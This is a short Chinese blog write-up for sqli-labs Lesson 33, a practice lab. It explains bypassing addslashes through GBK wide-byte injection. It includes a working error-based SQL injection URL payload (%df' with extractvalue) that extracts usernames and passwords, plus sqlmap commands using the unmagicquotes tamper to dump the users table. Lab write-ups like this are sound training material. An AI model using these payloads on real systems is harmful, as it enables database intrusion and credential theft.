---
title: sqli-labs lession-33 GET-绕过AddSlashes
date: 2018-10-15 14:40:01
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-33 GET-绕过AddSlashes

---

## 登录界面

![001](/img/sql/Lesson-33/001.png)

## 分析

![002](/img/sql/Lesson-33/002.png)

由于使用了addslashes函数将单引号（`’`）转义，但是使用了gbk编码,同样使用宽字节绕过。

![003](/img/sql/Lesson-33/003.png)

## 注入

跟上一课payload一模一样,过程图就不放上来了。

{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}

`http://192.168.75.132/sql/Less-33/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`

![004](/img/sql/Lesson-33/004.png)

## SQLMAP

tamper自带了宽字节绕过的脚本unmagicquotes.py

`sqlmap -u "http://192.168.75.132/sql/Less-33/?id=1'" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -v 3`

![006](/img/sql/Lesson-33/006.png)

![005](/img/sql/Lesson-33/005.png)

直接上结果

`sqlmap -u "http://192.168.75.132/sql/Less-33/?id=1'" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump`

![007](/img/sql/Lesson-33/007.png)

![008](/img/sql/Lesson-33/008.png)







